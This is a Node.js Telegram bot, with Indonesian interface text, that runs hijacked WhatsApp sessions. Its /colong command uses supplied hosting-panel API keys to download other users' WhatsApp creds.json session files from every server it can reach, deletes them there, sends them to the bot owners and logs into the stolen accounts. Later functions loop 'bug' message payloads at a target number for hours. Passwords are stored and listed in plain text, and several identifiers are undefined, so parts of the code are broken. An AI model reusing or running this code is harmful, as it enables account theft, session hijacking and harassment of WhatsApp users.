const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const { getUsers, saveUsers } = require("./userstore.js");

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require("cookie-parser");
app.use(cookieParser());
const userPath = path.join(__dirname, "./user.json");


const USAGE_LIMIT_FILE = "./usagelimit.json";
// ================== CHAT SYSTEM ================== //
const CHAT_FILE = path.join(__dirname, "./chat.json");

function getChat() {
  if (!fs.existsSync(CHAT_FILE)) return [];
  try {
    return JSON.parse(fs.readFileSync(CHAT_FILE, "utf8"));
  } catch (e) {
    console.error("❌ Gagal baca chat.json", e);
    return [];
  }
}

function saveChat(messages) {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(messages, null, 2));
}

function getUsageLimit() {
  try {
    if (fs.existsSync(USAGE_LIMIT_FILE)) {
      return JSON.parse(fs.readFileSync(USAGE_LIMIT_FILE, "utf-8"));
    } else {
      return {};
    }
  } catch (e) {
    return {};
  }
}

function getUsageLimit() {
  try {
    if (fs.existsSync(USAGE_LIMIT_FILE)) {
      return JSON.parse(fs.readFileSync(USAGE_LIMIT_FILE, "utf-8"));
    } else {
      return {};
    }
  } catch (e) {
    return {};
  }
}

function saveUsageLimit(data) {
  fs.writeFileSync(USAGE_LIMIT_FILE, JSON.stringify(data, null, 2));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAdmin(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "admin" || user.role === "owner");
}

function isresseller(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "resseller" || user.role === "owner");
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
  
const {
  default: makeWAAtaaet,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWAAtaaet: WAAtaaet,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let Xaa;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ataa = makeWAsocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ataa);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ataa.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ataa = makeWAAtaaet({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ataa);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ataa.requestPairingCode(BotNumber, "OVERLOAD");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ataa.ev.on("creds.update", saveCreds);
  return Ataa;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.magenta(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠿⢿⣷⣶⣤⡀⢀⣤⣶⣾⣿⠿⠿⣿⣷⣶⣶⣤⣄⣀⡀
⠉⠁⢀⣾⣿⣭⣍⡛⠻⠟⠋⠉⠙⠻⠿⠛⠛⠉⠉⠙⠻⠿⠋
⢀⣾⡿⠋⠁⠀⠈⠙⠛⠶⣶⣤⣄⡀⠀⠀⠀⠀⢀⣠⡾⠃⠀
⠸⣿⣧⣀⣤⣴⣶⣶⣶⣦⣤⣈⣉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀
⠀⠈⠻⢿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠛⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⠤⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣀
⣶⣿⣯⣭⣽⣿⣿⣿⣷⣶⣤⣄⡀⢀⣤⣾⣿⣿⣿⣯⣭⣿⣿
⠘⠿⠿⠛⠉⠉⠉⠛⠛⠿⣿⣿⣿⠿⠛⠋⠉⠉⠉⠉⠉⠙⠋
𝔇𝔢𝔰𝔱𝔯𝔬𝔶 𝔱𝔥𝔢 𝔫𝔬𝔯𝔪. 𝔅𝔢𝔠𝔬𝔪𝔢 𝔲𝔫𝔯𝔢𝔞𝔩.⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╔══════════════════════════════════════╗
║   ${chalk.bgBlackBright.bold(' Titans System Aktif  ')}.  ║
╠══════════════════════════════════════╣
║   ${chalk.cyanBright('ID OWNER')}   : ${chalk.yellowBright(OwnerId)}        
║   ${chalk.magentaBright('STATUS')}     : ${chalk.greenBright('BOT CONNECTED ✅')} 
╚══════════════════════════════════════╝
`))
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Titans - Control Account*  
[ ACCESS: GRANTED | SYSTEM ONLINE ]

━━━━━━━━━━━━━━━━━━━
👤 *USER MANAGEMENT*  
> /adduser   → *Create New User*  
> /edituser→ *Edit Existing User*  
> /extend  → *Extend User Expiry*  
> /deluser   → *Delete User*  
> /listuser → *Show Active User*  

━━━━━━━━━━━━━━━━━━━
🏷 *ROLE & ACCESS*  
> /address   → *Create resseller*  
> /addadmin   → *Grant Admin Access*  
> /addowner   → *Promote to Owner*  

━━━━━━━━━━━━━━━━━━━
🔗 *SESSION CONTROL*  
> /connect   → *Bind Bot Session*  
> /listsender→ *Show Active Senders*  
> /delsender → *Purge Sender Session*  
> /colong → *Colong In Sender White Session*
━━━━━━━━━━━━━━━━━━━
📡 _Grid Link Established_  
⚡ _Execute Commands with Precision._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/aboutrapp2" }
        ]
      ]
    }
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});

bot.command("colong", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /colong http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

bot.command("adduser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isresseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambah user.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /adduser username password durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "user" });
  saveUsers(users);
  
  const functionCode = `
  🧬 WEB LOGIN : \`https://${VPS}${PORT}\``
  
  return ctx.reply(
    `✅ User berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deluser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isresseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus user.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deluser username");
  }

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ resseller tidak bisa menghapus user Admin.");
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ User *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan OWNER.");
  if (args.length !== 4) return ctx.reply("Format: /addowner Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "owner" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`https://${VPS}${PORT}\``
  
  return ctx.reply(
    `✅ Owner berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus OWNER.");
  if (args.length !== 2) return ctx.reply("Format: /delowner username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username && u.role === "owner");

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan atau bukan owner.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Owner *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("address", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menambahkan resseller.");
  if (args.length !== 4) return ctx.reply("Format: /address Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "resseller" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`https://${VPS}${PORT}\``
  
  return ctx.reply(
    `✅ resseller berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delress", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menghapus resseller.");
  if (args.length !== 2) return ctx.reply("Format: /delress username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  if (users[index].role !== "resseller") return ctx.reply(`⚠️ *${username}* bukan resseller.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ resseller *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addadmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambahkan Admin.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /addadmin Username Password Durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({
    username,
    password,
    expired,
    role: "admin",
    telegram_id: userId
  });

  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`https://${VPS}${PORT}\``;

  return ctx.reply(
    `✅ Admin berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deladmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus Admin.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deladmin <username>");
  }

  const username = args[1];
  let users = getUsers();
  const target = users.find(u => u.username === username && u.role === "admin");

  if (!target) {
    return ctx.reply(`❌ Admin *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users = users.filter(u => u.username !== username);
  saveUsers(users);

  return ctx.reply(`🗑️ Admin *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("listuser", (ctx) => {
  const userId = ctx.from.id;
  if (!isresseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya resseller/Admin yang bisa menggunakan perintah ini.");
  }

  const users = getUsers();
  const isOwnerUser = isOwner(userId);

  let text = `📋 Daftar Pengguna:\n\n`;
  users.forEach((user) => {
    if (!isOwnerUser && user.role === "admin") return; // Admin tidak boleh lihat owner
    text += `👤 *${user.username}*\n🔑 ${user.password}\n📅 Exp: ${new Date(user.expired).toLocaleString("id-ID")}\n🎖️ Role: ${user.role}\n\n`;
  });

  return ctx.reply(text.trim(), { parse_mode: "Markdown" });
});

bot.command("edituser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isresseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya resseller/Admin yang bisa mengedit user.");
  }

  if (args.length < 5) {
    return ctx.reply("Format: /edituser Username Password Durasi Role");
  }

  const [_, username, password, durasi, role] = args;
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  if (!["user", "resseller", "admin", "owner"].includes(role)) {
    return ctx.reply(`⚠️ Role hanya bisa: User, resseller, Admin.`, { parse_mode: "Markdown" });
  }

  if (role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Kamu bukan owner, tidak bisa membuat user role owner.");
  }

  users[index] = {
    ...users[index],
    password,
    expired: Date.now() + parseInt(durasi) * 86400000,
    role
  };

  saveUsers(users);
  return ctx.reply(`✅ User *${username}* berhasil diperbarui.`, { parse_mode: "Markdown" });
});

bot.command("extend", (ctx) => {
  const userId = ctx.from.id;
  if (!isresseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya resseller/Admin yang bisa memperpanjang masa aktif.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length !== 3) return ctx.reply("Format: /extend Username Durasi");

  const [_, username, durasi] = args;
  const days = parseInt(durasi);
  if (isNaN(days) || days <= 0) return ctx.reply("❌ Durasi harus berupa angka lebih dari 0.");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin") return ctx.reply("⛔ Tidak bisa memperpanjang masa aktif untuk user role admin.");

  const now = Date.now();
  const base = users[index].expired > now ? users[index].expired : now;
  users[index].expired = base + (days * 86400000);

  saveUsers(users);
  ctx.reply(`✅ Masa aktif *${username}* berhasil diperpanjang hingga ${new Date(users[index].expired).toLocaleString("id-ID")}`, { parse_mode: "Markdown" });
});

// -------------------( ANDRO FUNC )------------------------------

// ---------------------------------------------------------------------------\\
async function DelayAndro(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 30) {
            await Promise.all([
            Jtwdlyinvis(X),
            gsInterx2(X),
            gsInterx2(X),
            gsInter(X),
            gsInter(X),
            exTension(X), 
            StoryMentiondelay(X) , 
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

// ---------------------------------------------------------------------------\\
async function DelayAndro2(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 30) {
            await Promise.all([
            gsInterx2(X),
            gsInterx2(X),
            gsInter(X),
            gsInter(X),
            Jtwdlyinvis(X), 
            exTension(X), 
            StoryMentiondelay(X), 
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
